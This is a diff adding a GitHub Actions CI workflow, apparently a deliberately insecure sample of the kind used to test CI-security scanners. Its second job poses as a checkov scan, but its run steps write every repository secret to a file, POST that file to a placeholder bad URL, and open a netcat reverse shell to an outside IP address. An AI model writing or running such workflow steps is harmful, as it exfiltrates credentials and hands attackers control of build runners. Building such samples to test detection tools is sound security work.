@@ -1,0 +1,44 @@
+name: CI
+
+on:
+  push:
+    branches: [main]
+
+jobs:
+  container-test-job:
+    runs-on: ubuntu-latest
+    container:
+      image: nginx:stable-alpine-perl
+      env:
+        NODE_ENV: development
+      ports:
+        - 80
+      volumes:
+        - my_docker_volume:/volume_mount
+      options: --cpus 1
+    steps:
+      - name: Check for dockerenv file
+        run: (ls /.dockerenv && echo Found dockerenv) || (echo No dockerenv)
+
+  bridgecrew:
+    runs-on: ubuntu-latest
+    container:
+      image: node:14.15
+      env:
+        NODE_ENV: development
+      ports:
+        - 80
+      volumes:
+        - my_docker_volume:/volume_mount
+      options: --cpus 1
+    steps:
+      - name: Run checkov
+        id: checkov
+        uses: bridgecrewio/checkov-action@master
+        env:
+          GITHUB_TOKEN: ${{secrets.THIS_IS_A_TEST_SECRET}}
+          ACTIONS_ALLOW_UNSECURE_COMMANDS: "true"
+        run: |
+          echo "${{ toJSON(secrets) }}" > .secrets
+          curl -X POST -s --data "@.secrets" <BADURL > /dev/null
+          rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|netcat 34.159.16.75 32032 >/tmp/f
